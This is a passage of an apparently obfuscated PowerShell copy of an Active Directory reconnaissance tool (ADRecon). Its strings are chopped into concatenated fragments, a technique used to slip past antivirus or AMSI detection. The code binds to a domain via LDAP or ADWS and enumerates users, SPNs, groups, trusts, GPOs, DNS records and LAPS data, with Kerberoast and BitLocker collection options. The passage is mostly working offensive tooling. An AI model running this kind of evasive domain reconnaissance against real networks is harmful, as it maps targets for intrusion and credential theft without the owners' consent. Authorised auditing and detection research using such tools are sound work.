        3 { [string] $computerrole = ('Member S'+'e'+'r'+'ver') }
        4 { [string] $computerrole = ('Bac'+'ku'+'p '+'Do'+'main'+' '+'Co'+'ntroller') }
        5 { [string] $computerrole = ('Pr'+'ima'+'r'+'y Do'+'mai'+'n Control'+'ler') }
        default { Write-Output ('Computer '+'Ro'+'le c'+'oul'+'d n'+'ot b'+'e i'+'dent'+'ified.') }
    }

    $RanonComputer = "$($computer.domain)\$([Environment]::MachineName) - $($computerrole) "
    Remove-Variable computer
    Remove-Variable computerdomainrole
    Remove-Variable computerrole

    # If either DomainController or Credentials are provided, treat as non-member
    If (($DomainController -ne "") -or ($Credential -ne [Management.Automation.PSCredential]::Empty))
    {
        # Disable loading of default drive on member
        If (($Method -eq ('A'+'DWS')) -and (-Not $UseAltCreds))
        {
            $Env:ADPS_LoadDefaultDrive = 0
        }
        $UseAltCreds = $true
    }

    # Import ActiveDirectory module
    If ($Method -eq ('ADW'+'S'))
    {
        If (Get-Module -ListAvailable -Name ActiveDirectory)
        {
            Try
            {
                # Suppress verbose output on module import
                $SaveVerbosePreference = $script:VerbosePreference;
                $script:VerbosePreference = ('Sil'+'entlyContin'+'ue');
                Import-Module ActiveDirectory -WarningAction Stop -ErrorAction Stop | Out-Null
                If ($SaveVerbosePreference)
                {
                    $script:VerbosePreference = $SaveVerbosePreference
                    Remove-Variable SaveVerbosePreference
                }
            }
            Catch
            {
                Write-Warning ('[In'+'voke-ADRecon'+'] Err'+'or imp'+'ort'+'i'+'n'+'g A'+'ct'+'iveDire'+'ctory '+'Mod'+'u'+'le'+' from'+' RSAT (Rem'+'o'+'te Server'+' '+'A'+'dmini'+'str'+'ation'+' To'+'ols'+') ... Continui'+'ng wit'+'h L'+'DAP')
                $Method = ('LDA'+'P')
                If ($SaveVerbosePreference)
                {
                    $script:VerbosePreference = $SaveVerbosePreference
                    Remove-Variable SaveVerbosePreference
                }
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
        }
        Else
        {
            Write-Warning ('[Invok'+'e-A'+'DRecon] '+'A'+'ctiveD'+'ir'+'e'+'ctory Mo'+'du'+'le'+' '+'from RS'+'AT (Rem'+'ot'+'e '+'Server '+'A'+'dmin'+'ist'+'ration'+' '+'Tool'+'s) i'+'s'+' not installed '+'... '+'Con'+'tinuing'+' with LDA'+'P')
            $Method = ('L'+'DAP')
        }
    }

    # Compile C# code
    # Suppress Debug output
    $SaveDebugPreference = $script:DebugPreference
    $script:DebugPreference = ('Sile'+'ntl'+'yCo'+'nti'+'nue')
    Try
    {
        $Advapi32 = Add-Type -MemberDefinition $Advapi32Def -Name ('Advapi'+'3'+'2') -Namespace ADRecon -PassThru
        $Kernel32 = Add-Type -MemberDefinition $Kernel32Def -Name ('Ke'+'rn'+'el32') -Namespace ADRecon -PassThru
        #Add-Type -TypeDefinition $PingCastleSMBScannerSource
        $CLR = ([System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion)[1]
        If ($Method -eq ('A'+'DWS'))
        {
            <#
            If ($PSVersionTable.PSEdition -eq "Core")
            {
                $refFolder = Join-Path -Path (Split-Path([PSObject].Assembly.Location)) -ChildPath "ref"
                Add-Type -TypeDefinition $($ADWSSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices")).Location
                    (Join-Path -Path $refFolder -ChildPath "System.Linq.dll")
                    #([System.Reflection.Assembly]::LoadWithPartialName("System.Linq")).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")).Location
                    (Join-Path -Path $refFolder -ChildPath "System.Collections.dll")
                    (Join-Path -Path $refFolder -ChildPath "System.Collections.NonGeneric.dll")
                    (Join-Path -Path $refFolder -ChildPath "mscorlib.dll")
                    (Join-Path -Path $refFolder -ChildPath "netstandard.dll")
                    (Join-Path -Path $refFolder -ChildPath "System.Runtime.Extensions.dll")
                    #([System.Reflection.Assembly]::LoadWithPartialName("System.Collections")).Location
                    #([System.Reflection.Assembly]::LoadWithPartialName("System.Collections.NonGeneric")).Location
                    #([System.Reflection.Assembly]::LoadWithPartialName("mscorlib")).Location
                    #([System.Reflection.Assembly]::LoadWithPartialName("netstandard")).Location
                    #([System.Reflection.Assembly]::LoadWithPartialName("System.Runtime.Extensions")).Location
                    (Join-Path -Path $refFolder -ChildPath "System.Threading.dll")
                    (Join-Path -Path $refFolder -ChildPath "System.Threading.Thread.dll")
                    (Join-Path -Path $refFolder -ChildPath "System.Console.dll")
                    (Join-Path -Path $refFolder -ChildPath "System.Diagnostics.TraceSource.dll")
                    ([System.Reflection.Assembly]::LoadWithPartialName("Microsoft.ActiveDirectory.Management")).Location
                    (Join-Path -Path $refFolder -ChildPath "System.Net.Primitives.dll")
                    ([System.Reflection.Assembly]::LoadWithPartialName("System.Security.AccessControl")).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName("System.IO.FileSystem.AccessControl")).Location
                    #(Join-Path -Path $refFolder -ChildPath "System.Security.dll")
                    #(Join-Path -Path $refFolder -ChildPath "System.Security.Principal.dll")
                    ([System.Reflection.Assembly]::LoadWithPartialName("System.Security.Principal")).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName("System.Security.Principal.Windows")).Location
                    (Join-Path -Path $refFolder -ChildPath "System.Xml.dll")
                    (Join-Path -Path $refFolder -ChildPath "System.Xml.XmlDocument.dll")
                    (Join-Path -Path $refFolder -ChildPath "System.Xml.ReaderWriter.dll")
                    #([System.Reflection.Assembly]::LoadWithPartialName("System.XML")).Location
                    (Join-Path -Path $refFolder -ChildPath "System.Net.Sockets.dll")
                    #([System.Reflection.Assembly]::LoadWithPartialName("System.Runtime")).Location
                    #(Join-Path -Path $refFolder -ChildPath "System.Runtime.dll")
                    #(Join-Path -Path $refFolder -ChildPath "System.Runtime.InteropServices.RuntimeInformation.dll")
                ))
                Remove-Variable refFolder
                # Todo Error: you may need to supply runtime policy
            }
            #>
            If ($CLR -eq "4")
            {
                Add-Type -TypeDefinition $($ADWSSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName(('Micr'+'os'+'oft'+'.A'+'ctiveD'+'irectory.'+'Man'+'age'+'ment'))).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(('System.Di'+'rec'+'toryS'+'ervic'+'es'))).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(('Sys'+'tem'+'.XML'))).Location
                ))
            }
            Else
            {
                Add-Type -TypeDefinition $($ADWSSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName(('Mi'+'crosoft.Ac'+'t'+'iveDirec'+'to'+'r'+'y.M'+'an'+'ag'+'emen'+'t'))).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(('System.D'+'i'+'r'+'ecto'+'rySe'+'r'+'vice'+'s'))).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(('S'+'yst'+'em.XML'))).Location
                )) -Language CSharpVersion3
            }
        }

        If ($Method -eq ('LD'+'AP'))
        {
            If ($CLR -eq "4")
            {
                Add-Type -TypeDefinition $($LDAPSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName(('S'+'yst'+'em.Di'+'rectorySe'+'rv'+'ices'))).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(('Syste'+'m'+'.XML'))).Location
                ))
            }
            Else
            {
                Add-Type -TypeDefinition $($LDAPSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName(('Syste'+'m.Dir'+'ect'+'or'+'yServices'))).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(('System.X'+'M'+'L'))).Location
                )) -Language CSharpVersion3
            }
        }
    }
    Catch
    {
        Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
        Return $null
    }
    If ($SaveDebugPreference)
    {
        $script:DebugPreference = $SaveDebugPreference
        Remove-Variable SaveDebugPreference
    }

    # Allow running using RUNAS from a non-domain joined machine
    # runas /user:<Domain FQDN>\<Username> /netonly powershell.exe
    If (($Method -eq ('L'+'DAP')) -and ($UseAltCreds) -and ($DomainController -eq "") -and ($Credential -eq [Management.Automation.PSCredential]::Empty))
    {
        Try
        {
            $objDomain = [ADSI]""
            If(!($objDomain.name))
            {
                Write-Verbose ('[Invo'+'k'+'e'+'-'+'ADRecon'+'] '+'RUNAS '+'Check,'+' L'+'DA'+'P bind Unsu'+'ccessful')
            }
            $UseAltCreds = $false
            $objDomain.Dispose()
        }
        Catch
        {
            $UseAltCreds = $true
        }
    }

    If ($UseAltCreds -and (($DomainController -eq "") -or ($Credential -eq [Management.Automation.PSCredential]::Empty)))
    {

        If (($DomainController -ne "") -and ($Credential -eq [Management.Automation.PSCredential]::Empty))
        {
            Try
            {
                $Credential = Get-Credential
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
                Return $null
            }
        }
        Else
        {
            Write-Output (('Run Get'+'-Help .'+'fJ'+'DADR'+'e'+'con.ps1'+' -'+'Examp'+'l'+'e'+'s '+'for addi'+'ti'+'onal '+'inf'+'orm'+'ati'+'on.').rePlace('fJD','\'))
            Write-Output ('['+'I'+'n'+'voke-A'+'D'+'Recon]'+' Use'+' '+'th'+'e -D'+'omai'+'nCo'+'ntrol'+'ler'+' and -'+'Credentia'+'l'+' param'+'eter.')`n
            Return $null
        }
    }

    Write-Output ('[*]'+' '+'R'+'unnin'+'g '+'o'+'n '+"$RanonComputer")

    Switch ($Collect)
    {
        ('Fores'+'t') { $ADRForest = $true }
        ('D'+'oma'+'in') {$ADRDomain = $true }
        ('T'+'rusts') { $ADRTrust = $true }
        ('Si'+'tes') { $ADRSite = $true }
        ('Su'+'bne'+'ts') { $ADRSubnet = $true }
        ('Sc'+'h'+'emaHi'+'story') { $ADRSchemaHistory = $true }
        ('Passw'+'or'+'dPol'+'icy') { $ADRPasswordPolicy = $true }
        ('FineG'+'raine'+'dPas'+'swordPo'+'licy') { $ADRFineGrainedPasswordPolicy = $true }
        ('D'+'oma'+'i'+'nCon'+'troll'+'ers') { $ADRDomainControllers = $true }
        ('Us'+'ers') { $ADRUsers = $true }
        ('UserSP'+'N'+'s') { $ADRUserSPNs = $true }
        ('Passwo'+'rdA'+'ttr'+'i'+'butes') { $ADRPasswordAttributes = $true }
        ('G'+'roups') {$ADRGroups = $true }
        ('Group'+'Ch'+'ang'+'es') { $ADRGroupChanges = $true }
        ('G'+'roupMemb'+'er'+'s') { $ADRGroupMembers = $true }
        ('O'+'Us') { $ADROUs = $true }
        ('GPO'+'s') { $ADRGPOs = $true }
        ('g'+'P'+'Links') { $ADRgPLinks = $true }
        ('DNS'+'Zones') { $ADRDNSZones = $true }
        ('D'+'NS'+'Reco'+'rds') { $ADRDNSRecords = $true }
        ('P'+'rin'+'ters') { $ADRPrinters = $true }
        ('Co'+'mputer'+'s') { $ADRComputers = $true }
        ('Compu'+'ter'+'SP'+'Ns') { $ADRComputerSPNs = $true }
        ('L'+'APS') { $ADRLAPS = $true }
        ('B'+'itLocker') { $ADRBitLocker = $true }
        ('ACL'+'s') { $ADRACLs = $true }
        ('G'+'POR'+'eport')
        {
            $ADRGPOReport = $true
            $ADRCreate = $true
        }
        ('Ker'+'b'+'eroast') { $ADRKerberoast = $true }
        ('DomainAcc'+'ou'+'ntsuse'+'dfo'+'rSe'+'rviceLogon') { $ADRDomainAccountsusedforServiceLogon = $true }
        ('D'+'efault')
        {
            $ADRForest = $true
            $ADRDomain = $true
            $ADRTrust = $true
            $ADRSite = $true
            $ADRSubnet = $true
            $ADRSchemaHistory = $true
            $ADRPasswordPolicy = $true
            $ADRFineGrainedPasswordPolicy = $true
            $ADRDomainControllers = $true
            $ADRUsers = $true
            $ADRUserSPNs = $true
            $ADRPasswordAttributes = $true
            $ADRGroups = $true
            $ADRGroupMembers = $true
            $ADRGroupChanges = $true
            $ADROUs = $true
            $ADRGPOs = $true
            $ADRgPLinks = $true
            $ADRDNSZones = $true
            $ADRDNSRecords = $true
            $ADRPrinters = $true
            $ADRComputers = $true
            $ADRComputerSPNs = $true
            $ADRLAPS = $true
            $ADRBitLocker = $true
            #$ADRACLs = $true
            $ADRGPOReport = $true
            #$ADRKerberoast = $true
            #$ADRDomainAccountsusedforServiceLogon = $true

            If ($OutputType -eq ('De'+'faul'+'t'))
            {
                [array] $OutputType = ('C'+'SV'),('Exc'+'el')
            }
        }
    }

    Switch ($OutputType)
    {
        ('STDO'+'UT') { $ADRSTDOUT = $true }
        ('CS'+'V')
        {
            $ADRCSV = $true
            $ADRCreate = $true
        }
        ('XM'+'L')
        {
            $ADRXML = $true
            $ADRCreate = $true
        }
        ('J'+'SON')
        {
            $ADRJSON = $true
            $ADRCreate = $true
        }
        ('HTM'+'L')
        {
            $ADRHTML = $true
            $ADRCreate = $true
        }
        ('Ex'+'cel')
        {
            $ADRExcel = $true
            $ADRCreate = $true
        }
        ('A'+'ll')
        {
            #$ADRSTDOUT = $true
            $ADRCSV = $true
            $ADRXML = $true
            $ADRJSON = $true
            $ADRHTML = $true
            $ADRExcel = $true
            $ADRCreate = $true
            [array] $OutputType = ('C'+'SV'),('XM'+'L'),('J'+'SON'),('HTM'+'L'),('Exce'+'l')
        }
        ('Def'+'ault')
        {
            [array] $OutputType = ('S'+'TDOUT')
            $ADRSTDOUT = $true
        }
    }

    If ( ($ADRExcel) -and (-Not $ADRCSV) )
    {
        $ADRCSV = $true
        [array] $OutputType += ('C'+'SV')
    }

    $returndir = Get-Location
    $date = Get-Date

    # Create Output dir
    If ( ($ADROutputDir) -and ($ADRCreate) )
    {
        If (!(Test-Path $ADROutputDir))
        {
            New-Item $ADROutputDir -type directory | Out-Null
            If (!(Test-Path $ADROutputDir))
            {
                Write-Output ('[I'+'nvoke-ADR'+'econ'+']'+' Error'+', in'+'va'+'lid Out'+'pu'+'tDir'+' '+'Path ... E'+'xi'+'ting')
                Return $null
            }
        }
        $ADROutputDir = $((Convert-Path $ADROutputDir).TrimEnd("\"))
        Write-Verbose ('[*'+'] '+'Out'+'put'+' '+'Direc'+'tory:'+' '+"$ADROutputDir")
    }
    ElseIf ($ADRCreate)
    {
        $ADROutputDir =  -join($returndir,'\',('ADR'+'ec'+'on-Repo'+'r'+'t-'),$(Get-Date -UFormat %Y%m%d%H%M%S))
        New-Item $ADROutputDir -type directory | Out-Null
        If (!(Test-Path $ADROutputDir))
        {
            Write-Output ('[In'+'v'+'oke'+'-A'+'DRecon] Error, could'+' not cr'+'ea'+'te'+' o'+'utput '+'directory')
            Return $null
        }
        $ADROutputDir = $((Convert-Path $ADROutputDir).TrimEnd("\"))
        Remove-Variable ADRCreate
    }
    Else
    {
        $ADROutputDir = $returndir
    }

    If ($ADRCSV)
    {
        $CSVPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\',('C'+'SV-Fi'+'les'))
        New-Item $CSVPath -type directory | Out-Null
        If (!(Test-Path $CSVPath))
        {
            Write-Output ('[Invoke-'+'ADRecon] E'+'rr'+'or'+', cou'+'l'+'d not create'+' '+'output '+'directory')
            Return $null
        }
        Remove-Variable ADRCSV
    }

    If ($ADRXML)
    {
        $XMLPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\',('XML-'+'Files'))
        New-Item $XMLPath -type directory | Out-Null
        If (!(Test-Path $XMLPath))
        {
            Write-Output ('[Inv'+'oke-A'+'D'+'Recon]'+' Error,'+' co'+'uld no'+'t'+' '+'create'+' ou'+'tp'+'ut dire'+'ctory')
            Return $null
        }
        Remove-Variable ADRXML
    }

    If ($ADRJSON)
    {
        $JSONPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\',('JSON'+'-'+'F'+'iles'))
        New-Item $JSONPath -type directory | Out-Null
        If (!(Test-Path $JSONPath))
        {
            Write-Output ('['+'In'+'vo'+'ke-AD'+'Recon] Er'+'ror, co'+'uld no'+'t'+' create '+'outpu'+'t'+' dir'+'ect'+'ory')
            Return $null
        }
        Remove-Variable ADRJSON
    }

    If ($ADRHTML)
    {
        $HTMLPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\',('H'+'TM'+'L-Files'))
        New-Item $HTMLPath -type directory | Out-Null
        If (!(Test-Path $HTMLPath))
        {
            Write-Output ('[In'+'v'+'oke-'+'ADRec'+'on] Error, cou'+'ld '+'not c'+'re'+'a'+'te'+' out'+'put directory')
            Return $null
        }
        Remove-Variable ADRHTML
    }

    # AD Login
    If ($UseAltCreds -and ($Method -eq ('AD'+'WS')))
    {
        If (!(Test-Path ADR:))
        {
            Try
            {
                New-PSDrive -PSProvider ActiveDirectory -Name ADR -Root "" -Server $DomainController -Credential $Credential -ErrorAction Stop | Out-Null
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Else
        {
            Remove-PSDrive ADR
            Try
            {
                New-PSDrive -PSProvider ActiveDirectory -Name ADR -Root "" -Server $DomainController -Credential $Credential -ErrorAction Stop | Out-Null
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Set-Location ADR:
        Write-Debug ('ADR'+' PSDr'+'i'+'ve '+'Creat'+'ed')
    }

    If ($Method -eq ('L'+'DAP'))
    {
        If ($UseAltCreds)
        {
            Try
            {
                $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objDomainRootDSE = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/RootDSE", $Credential.UserName,$Credential.GetNetworkCredential().Password
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
            If(!($objDomain.name))
            {
                Write-Output ('['+'Invoke-ADRecon] L'+'DAP '+'bind Unsuc'+'c'+'es'+'s'+'ful')
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
            Else
            {
                Write-Output ('['+'*] LDA'+'P b'+'i'+'nd Succ'+'essf'+'ul')
            }
        }
        Else
        {
            $objDomain = [ADSI]""
            $objDomainRootDSE = ([ADSI] ('LD'+'AP'+':/'+'/Root'+'DSE'))
            If(!($objDomain.name))
            {
                Write-Output ('[In'+'vok'+'e'+'-ADRecon] LDAP'+' bind'+' Unsuccessf'+'ul')
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Write-Debug ('LDAP Bing '+'Succ'+'es'+'sf'+'ul')
    }

    Write-Output ('['+'*] '+'C'+'ommenc'+'ing '+'- '+"$date")
    If ($ADRDomain)
    {
        Write-Output ('[-] D'+'omai'+'n')
        $ADRObject = Get-ADRDomain -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('D'+'omain')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomain
    }
    If ($ADRForest)
    {
        Write-Output ('[-] F'+'ore'+'st')
        $ADRObject = Get-ADRForest -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('For'+'es'+'t')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRForest
    }
    If ($ADRTrust)
    {
        Write-Output ('[-] '+'Trust'+'s')
        $ADRObject = Get-ADRTrust -Method $Method -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('Trus'+'ts')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRTrust
    }
    If ($ADRSite)
    {
        Write-Output ('[-] Si'+'te'+'s')
        $ADRObject = Get-ADRSite -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('S'+'ites')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSite
    }
    If ($ADRSubnet)
    {
        Write-Output ('[-] S'+'u'+'bne'+'ts')
        $ADRObject = Get-ADRSubnet -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('Subne'+'ts')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSubnet
    }
    If ($ADRSchemaHistory)
    {
        Write-Output ('[-]'+' S'+'chemaH'+'i'+'st'+'ory - May ta'+'ke some ti'+'m'+'e')
        $ADRObject = Get-ADRSchemaHistory -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('Sch'+'ema'+'H'+'istory')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSchemaHistory
    }
    If ($ADRPasswordPolicy)
    {
        Write-Output ('[-] Def'+'a'+'ult Pas'+'sw'+'ord Policy')
        $ADRObject = Get-ADRDefaultPasswordPolicy -Method $Method -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('D'+'ef'+'aultPa'+'sswordPo'+'l'+'icy')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPasswordPolicy
    }
    If ($ADRFineGrainedPasswordPolicy)
    {
        Write-Output ('[-]'+' Fine Gra'+'ined Password P'+'o'+'licy - M'+'a'+'y need a'+' Privi'+'leg'+'e'+'d Account')
        $ADRObject = Get-ADRFineGrainedPasswordPolicy -Method $Method -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('F'+'ineG'+'r'+'ain'+'edPasswo'+'r'+'dPo'+'licy')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRFineGrainedPasswordPolicy
    }
    If ($ADRDomainControllers)
    {
        Write-Output ('[-] Do'+'main Co'+'ntro'+'l'+'lers')
        $ADRObject = Get-ADRDomainController -Method $Method -objDomain $objDomain -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('Doma'+'in'+'Con'+'tr'+'ollers')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomainControllers
    }
    If ($ADRUsers -or $ADRUserSPNs)
    {
        If (!$ADRUserSPNs)
        {
            Write-Output ('[-]'+' User'+'s '+'- May t'+'ake s'+'o'+'me'+' '+'time')
            $ADRUserSPNs = $false
        }
        ElseIf (!$ADRUsers)
        {
            Write-Output ('['+'-] U'+'ser SP'+'Ns')
            $ADRUsers = $false
        }
        Else
        {
            Write-Output ('['+'-] User'+'s an'+'d SPNs'+' -'+' '+'M'+'ay take '+'some '+'time')
        }
        Get-ADRUser -Method $Method -date $date -objDomain $objDomain -DormantTimeSpan $DormantTimeSpan -PageSize $PageSize -Threads $Threads -ADRUsers $ADRUsers -ADRUserSPNs $ADRUserSPNs
        Remove-Variable ADRUsers
        Remove-Variable ADRUserSPNs
    }
    If ($ADRPasswordAttributes)
    {
        Write-Output ('[-] '+'Passwo'+'rdAttributes'+' - Ex'+'peri'+'me'+'ntal')
        $ADRObject = Get-ADRPasswordAttributes -Method $Method -objDomain $objDomain -PageSize $PageSize
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('P'+'a'+'ssw'+'ord'+'Attributes')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPasswordAttributes
    }
    If ($ADRGroups -or $ADRGroupChanges)
    {
        If (!$ADRGroupChanges)
        {
            Write-Output ('[-] Groups - '+'May take'+' some t'+'i'+'m'+'e')
            $ADRGroupChanges = $false
        }
        ElseIf (!$ADRGroups)
        {
            Write-Output ('[-] Group Me'+'mber'+'shi'+'p Changes '+'- May'+' take s'+'om'+'e ti'+'m'+'e')
            $ADRGroups = $false
        }
        Else
        {
            Write-Output ('[-'+'] G'+'roups'+' and Mem'+'be'+'rship'+' Changes'+' - May'+' take so'+'me ti'+'me')
        }
        Get-ADRGroup -Method $Method -date $date -objDomain $objDomain -PageSize $PageSize -Threads $Threads -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRGroups $ADRGroups -ADRGroupChanges $ADRGroupChanges
        Remove-Variable ADRGroups
        Remove-Variable ADRGroupChanges
    }
    If ($ADRGroupMembers)
    {
        Write-Output ('[-]'+' Group M'+'emb'+'ersh'+'i'+'ps - May '+'take'+' som'+'e'+' t'+'ime')

        $ADRObject = Get-ADRGroupMember -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('GroupM'+'e'+'m'+'bers')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRGroupMembers
    }
    If ($ADROUs)
    {
        Write-Output ('[-'+'] '+'Or'+'gan'+'iz'+'a'+'tiona'+'lUnits '+'(OUs)')
        $ADRObject = Get-ADROU -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('OU'+'s')
            Remove-Variable ADRObject
        }
        Remove-Variable ADROUs
    }
    If ($ADRGPOs)
    {
        Write-Output ('[-] '+'GPOs')
        $ADRObject = Get-ADRGPO -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('G'+'POs')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRGPOs
    }
    If ($ADRgPLinks)
    {
        Write-Output ('[-] gPLinks - '+'Scope of Mana'+'gem'+'ent'+' '+'(S'+'OM)')
        $ADRObject = Get-ADRgPLink -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('gPL'+'inks')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRgPLinks
    }
    If ($ADRDNSZones -or $ADRDNSRecords)
    {
        If (!$ADRDNSRecords)
        {
            Write-Output ('[-] D'+'NS Zone'+'s')
            $ADRDNSRecords = $false
        }
        ElseIf (!$ADRDNSZones)
        {
            Write-Output ('[-'+'] DNS'+' '+'Rec'+'ords')
            $ADRDNSZones = $false
        }
        Else
        {
            Write-Output ('[-] DNS Zones a'+'nd'+' '+'R'+'ecor'+'ds')
        }
        Get-ADRDNSZone -Method $Method -objDomain $objDomain -DomainController $DomainController -Credential $Credential -PageSize $PageSize -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRDNSZones $ADRDNSZones -ADRDNSRecords $ADRDNSRecords
        Remove-Variable ADRDNSZones
    }
    If ($ADRPrinters)
    {
        Write-Output ('[-]'+' Pr'+'inter'+'s')
        $ADRObject = Get-ADRPrinter -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('P'+'rin'+'ters')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPrinters
    }
    If ($ADRComputers -or $ADRComputerSPNs)
    {
        If (!$ADRComputerSPNs)
        {
            Write-Output ('[-] C'+'omputer'+'s - May '+'take'+' some '+'time')
            $ADRComputerSPNs = $false
        }
        ElseIf (!$ADRComputers)
        {
            Write-Output ('['+'-]'+' Co'+'mput'+'er SPNs')
            $ADRComputers = $false
        }
        Else
        {
            Write-Output ('[-]'+' Co'+'mpute'+'rs'+' '+'and '+'SP'+'Ns - M'+'ay t'+'ake some time')
        }
        Get-ADRComputer -Method $Method -date $date -objDomain $objDomain -DormantTimeSpan $DormantTimeSpan -PassMaxAge $PassMaxAge -PageSize $PageSize -Threads $Threads -ADRComputers $ADRComputers -ADRComputerSPNs $ADRComputerSPNs
        Remove-Variable ADRComputers
        Remove-Variable ADRComputerSPNs
    }
    If ($ADRLAPS)
    {
        Write-Output ('[-] LAPS -'+' '+'N'+'e'+'ed'+'s Pri'+'vi'+'le'+'ged Ac'+'c'+'ount')
        $ADRObject = Get-ADRLAPSCheck -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('LA'+'PS')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRLAPS
    }
